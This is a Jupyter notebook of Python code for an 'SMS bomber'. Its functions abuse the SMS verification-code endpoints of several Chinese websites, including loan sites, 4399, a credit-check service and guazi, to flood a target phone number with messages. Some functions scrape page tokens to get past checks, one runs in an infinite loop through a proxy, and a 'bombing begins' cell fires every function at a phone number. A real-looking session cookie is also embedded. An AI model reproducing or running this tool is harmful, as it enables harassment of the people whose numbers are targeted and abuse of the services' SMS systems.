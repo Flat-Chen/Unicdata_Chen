{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true,
    "pycharm": {
     "is_executing": false
    }
   },
   "outputs": [],
   "source": [
    "import json\n",
    "import requests\n",
    "import time \n",
    "from lxml import etree\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "outputs": [
    {
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-2-e45cf2114b79>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m      9\u001b[0m         \u001b[0mprint\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m'正规贷款信息发送失败！'\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     10\u001b[0m \u001b[1;32mwhile\u001b[0m \u001b[1;36m1\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 11\u001b[1;33m     \u001b[0mzgdk\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m'18888888888'\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     12\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32m<ipython-input-2-e45cf2114b79>\u001b[0m in \u001b[0;36mzgdk\u001b[1;34m(phone)\u001b[0m\n\u001b[0;32m      2\u001b[0m     \u001b[0mdata\u001b[0m \u001b[1;33m=\u001b[0m \u001b[1;33m{\u001b[0m\u001b[1;34m'mobile'\u001b[0m\u001b[1;33m:\u001b[0m\u001b[0mphone\u001b[0m\u001b[1;33m}\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      3\u001b[0m     response = requests.post(url='https://mgjr.360yhzd.com/api/sms/getCode', \n\u001b[1;32m----> 4\u001b[1;33m                              data=data,proxies='http://122.245.155.161:20245')\n\u001b[0m\u001b[0;32m      5\u001b[0m     \u001b[0mtext\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mresponse\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mtext\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      6\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[1;34m'提交成功'\u001b[0m \u001b[1;32min\u001b[0m \u001b[0mtext\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mc:\\users\\13164\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\requests\\api.py\u001b[0m in \u001b[0;36mpost\u001b[1;34m(url, data, json, **kwargs)\u001b[0m\n\u001b[0;32m    114\u001b[0m     \"\"\"\n\u001b[0;32m    115\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 116\u001b[1;33m     \u001b[1;32mreturn\u001b[0m \u001b[0mrequest\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m'post'\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0murl\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mdata\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mdata\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mjson\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mjson\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    117\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    118\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mc:\\users\\13164\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\requests\\api.py\u001b[0m in \u001b[0;36mrequest\u001b[1;34m(method, url, **kwargs)\u001b[0m\n\u001b[0;32m     58\u001b[0m     \u001b[1;31m# cases, and look like a memory leak in others.\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     59\u001b[0m     \u001b[1;32mwith\u001b[0m \u001b[0msessions\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mSession\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;32mas\u001b[0m \u001b[0msession\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 60\u001b[1;33m         \u001b[1;32mreturn\u001b[0m \u001b[0msession\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mrequest\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mmethod\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mmethod\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0murl\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0murl\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     61\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     62\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mc:\\users\\13164\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\requests\\sessions.py\u001b[0m in \u001b[0;36mrequest\u001b[1;34m(self, method, url, params, data, headers, cookies, files, auth, timeout, allow_redirects, proxies, hooks, stream, verify, cert, json)\u001b[0m\n\u001b[0;32m    522\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    523\u001b[0m         settings = self.merge_environment_settings(\n\u001b[1;32m--> 524\u001b[1;33m             \u001b[0mprep\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0murl\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mproxies\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mstream\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mverify\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mcert\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    525\u001b[0m         )\n\u001b[0;32m    526\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mc:\\users\\13164\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\requests\\sessions.py\u001b[0m in \u001b[0;36mmerge_environment_settings\u001b[1;34m(self, url, proxies, stream, verify, cert)\u001b[0m\n\u001b[0;32m    697\u001b[0m         \u001b[1;32mif\u001b[0m \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mtrust_env\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    698\u001b[0m             \u001b[1;31m# Set environment's proxies.\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 699\u001b[1;33m             \u001b[0mno_proxy\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mproxies\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mget\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m'no_proxy'\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;32mif\u001b[0m \u001b[0mproxies\u001b[0m \u001b[1;32mis\u001b[0m \u001b[1;32mnot\u001b[0m \u001b[1;32mNone\u001b[0m \u001b[1;32melse\u001b[0m \u001b[1;32mNone\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    700\u001b[0m             \u001b[0menv_proxies\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mget_environ_proxies\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0murl\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mno_proxy\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mno_proxy\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    701\u001b[0m             \u001b[1;32mfor\u001b[0m \u001b[1;33m(\u001b[0m\u001b[0mk\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mv\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;32min\u001b[0m \u001b[0menv_proxies\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mitems\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mAttributeError\u001b[0m: 'str' object has no attribute 'get'"
     ],
     "ename": "AttributeError",
     "evalue": "'str' object has no attribute 'get'",
     "output_type": "error"
    }
   ],
   "source": [
    "def zgdk(phone):\n",
    "    data = {'mobile':phone}\n",
    "    proxy = {'http': '122.245.155.161:20245'}\n",
    "    response = requests.post(url='https://mgjr.360yhzd.com/api/sms/getCode', \n",
    "                             data=data,proxies=proxy)\n",
    "    text = response.text\n",
    "    if '提交成功' in text:\n",
    "        print('正规贷款信息发送成功!')\n",
    "    else:\n",
    "        print('正规贷款信息发送失败！')\n",
    "while 1:\n",
    "    zgdk('18888888888')\n",
    "    "
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% 正规贷款 一天50条\n",
     "is_executing": false
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "outputs": [],
   "source": [
    "def rdd(phone):\n",
    "    session = requests.session()\n",
    "    url = 'https://91rongduoduo.com/m/bdss04'\n",
    "    text = session.get(url).text\n",
    "    html = etree.HTML(text)\n",
    "    usertoken = html.xpath('//input[@id=\"usertoken\"]/@value')[0]\n",
    "    data = {\n",
    "        'phone' : phone,\n",
    "        'name' : '张伟伟',\n",
    "        'usertoken' : usertoken\n",
    "    }\n",
    "    response = session.post(url='https://91rongduoduo.com/m/center_code', data=data)\n",
    "    text = response.text\n",
    "    if '发送成功' in text:\n",
    "        print('融多多贷款信息发送成功!')\n",
    "    else:\n",
    "        print('融多多贷款信息发送失败！')\n"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% 融多多贷款\n",
     "is_executing": false
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "outputs": [],
   "source": [
    "    \n",
    "def ms(phone):\n",
    "    session = requests.session()\n",
    "    url = 'http://msswxx.com/m/mss01'\n",
    "    text = session.get(url).text\n",
    "    html = etree.HTML(text)\n",
    "    usertoken = html.xpath('//input[@id=\"usertoken\"]/@value')[0]\n",
    "    data = {\n",
    "        'phone' : phone,\n",
    "        'name' : '张伟伟',\n",
    "        'usertoken' : usertoken\n",
    "    }\n",
    "    response = session.post(url='http://msswxx.com/m/center_code', data=data)\n",
    "    text = response.text\n",
    "    if '发送成功' in text:\n",
    "        print('穆帅贷款信息发送成功!')\n",
    "    else:\n",
    "        print('穆帅贷款信息发送失败！')\n"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% 穆帅贷款\n",
     "is_executing": false
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "outputs": [],
   "source": [
    "def lyxx(phone):\n",
    "    data = {'mobile':phone}\n",
    "    response = requests.post(url='http://www.lyxxjs.com/msm/code/sendSms.do', data=data)\n",
    "    text = response.text\n",
    "    if '发送成功' in text:\n",
    "        print('郎宇信息信息发送成功!')\n",
    "    else:\n",
    "        print('郎宇信息信息发送失败！')\n",
    "        "
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% 郎宇信息\n",
     "is_executing": false
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "outputs": [],
   "source": [
    "def dtx(phone):\n",
    "    headers = {'Referer': 'https://www.diantoushi.com/useradmin.html?type=searchBlack'}\n",
    "    url = f'https://www.diantoushi.com/user/v2/captcha?mobile={phone}'\n",
    "    response = requests.get(url=url,headers=headers)\n",
    "    if '\"status\":0,\"message\":\"ok\"' in response.text:\n",
    "        print('店透视信息发送成功!')\n",
    "    else:\n",
    "        print('店透视信息发送失败！')"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% 店透视\n",
     "is_executing": false
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "outputs": [],
   "source": [
    "def czx(phone):\n",
    "    headers = {\n",
    "        'accept': '*/*',\n",
    "        'content-type': 'application/json',\n",
    "        'referer': 'https://www.sczhengxin.com/h5/index.html?Channel=bdpcxyd01&bd_vid=10244023290222874317',\n",
    "        'x-requested-with': 'XMLHttpRequest',\n",
    "    }\n",
    "    url = 'https://www.sczhengxin.com/api/home/SmsPush'\n",
    "    response = requests.post(url=url,data=json.dumps({\"PhoneNumber\":phone}),headers=headers)\n",
    "    # print(response.text)\n",
    "    if '\"statusCode\":0,\"code\":1' in response.text:\n",
    "        print('查征信信息发送成功!')\n",
    "    else:\n",
    "        print('查征信信息发送失败！')"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% 查征信\n",
     "is_executing": false
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "outputs": [
    {
     "name": "stdout",
     "text": [
      "<Response [200]>\n2,captchaReq066d528605e35471589\n4399信息发送成功!\n2,captchaReq066d528605e35471589\n"
     ],
     "output_type": "stream"
    }
   ],
   "source": [
    "def ssjj(phone):\n",
    "    url = 'http://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone={}&appId=www_home&v=1&sig=&t={}&v=1'.format(phone,int(time.time()*1000))\n",
    "    response = requests.get(url)\n",
    "    print(response)\n",
    "    print(response.text)\n",
    "    if '4' in response.text:\n",
    "        print('4399信息发送成功!')\n",
    "        print(response.text)\n",
    "    else:\n",
    "        print('4399信息发送失败！')\n",
    "\n",
    "ssjj('18855488986')"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%  4399\n",
     "is_executing": false
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "outputs": [
    {
     "name": "stdout",
     "text": [
      "查征信信息发送成功!\n"
     ],
     "output_type": "stream"
    }
   ],
   "source": [
    "def start(phone):\n",
    "    rdd(phone)\n",
    "    zgdk(phone)\n",
    "    ms(phone)\n",
    "    lyxx(phone)\n",
    "    dtx(phone)\n",
    "    czx(phone)\n",
    "    ssjj(phone)\n",
    "start('18855488486')"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% 轰炸开始\n",
     "is_executing": false
    }
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "headers = {\n",
    "    'Accept': 'application/json, text/javascript, */*; q=0.01',\n",
    "    'Accept-Encoding': 'gzip, deflate, br',\n",
    "    'Accept-Language': 'zh-CN,zh;q=0.9',\n",
    "    'Connection': 'keep-alive',\n",
    "    'Content-Length': '72',\n",
    "    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',\n",
    "    'Cookie': 'uuid=999a6cab-52cb-4a07-f581-332c9d007a38; ganji_uuid=3539163910898028701029; antipas=6SY9R49qK452802N765b855H48; cityDomain=sh; clueSourceCode=%2A%2300; user_city_id=13; sessionid=154e0871-e55b-4aae-b17a-cb4e53877f14; lg=1; gps_type=1; close_finance_popup=2020-10-21; cainfo=%7B%22ca_a%22%3A%22-%22%2C%22ca_b%22%3A%22-%22%2C%22ca_s%22%3A%22self%22%2C%22ca_n%22%3A%22self%22%2C%22ca_medium%22%3A%22-%22%2C%22ca_term%22%3A%22-%22%2C%22ca_content%22%3A%22-%22%2C%22ca_campaign%22%3A%22-%22%2C%22ca_kw%22%3A%22-%22%2C%22ca_i%22%3A%22-%22%2C%22scode%22%3A%22-%22%2C%22keyword%22%3A%22-%22%2C%22ca_keywordid%22%3A%22-%22%2C%22display_finance_flag%22%3A%22-%22%2C%22platform%22%3A%221%22%2C%22version%22%3A1%2C%22client_ab%22%3A%22-%22%2C%22guid%22%3A%22999a6cab-52cb-4a07-f581-332c9d007a38%22%2C%22ca_city%22%3A%22sh%22%2C%22sessionid%22%3A%22154e0871-e55b-4aae-b17a-cb4e53877f14%22%7D; preTime=%7B%22last%22%3A1603262712%2C%22this%22%3A1603261811%2C%22pre%22%3A1603261811%7D; lng_lat=121.448581_31.338107',\n",
    "    'Host': 'www.guazi.com',\n",
    "    'Origin': 'https://www.guazi.com',\n",
    "    'Referer': 'https://www.guazi.com/sh/',\n",
    "    'Sec-Fetch-Dest': 'empty',\n",
    "    'Sec-Fetch-Mode': 'cors',\n",
    "    'Sec-Fetch-Site': 'same-origin',\n",
    "    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',\n",
    "    'X-Requested-With': 'XMLHttpRequest',\n",
    "}\n",
    "def gz(phone):\n",
    "    session = requests.session()\n",
    "    url = 'https://www.guazi.com/sh/'\n",
    "    response = session.get(url=url, headers=headers)\n",
    "    response.encoding = response.apparent_encoding\n",
    "    print(response.text)\n",
    "    html = etree.HTML(response.text)\n",
    "    token = html.xpath('//div[@class=\"js-check-post-code\"]/@data-str')[0]\n",
    "    datetime = html.xpath('//div[@class=\"js-check-post-code\"]/@data-time')[0]\n",
    "    print(token,datetime)\n",
    "    data = {\n",
    "        'phone': phone,\n",
    "        'time': datetime,\n",
    "        'token': token,\n",
    "    }\n",
    "    response = session.post(url='https://www.guazi.com/zq_user/?act=register',\n",
    "                           data=data,headers=headers)\n",
    "    print(data)\n",
    "    json_data = json.loads(response.text)\n",
    "    print(json_data)\n",
    "gz('18721111311') "
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% 瓜子\n",
     "is_executing": false
    }
   }
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  },
  "pycharm": {
   "stem_cell": {
    "cell_type": "raw",
    "source": [],
    "metadata": {
     "collapsed": false
    }
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}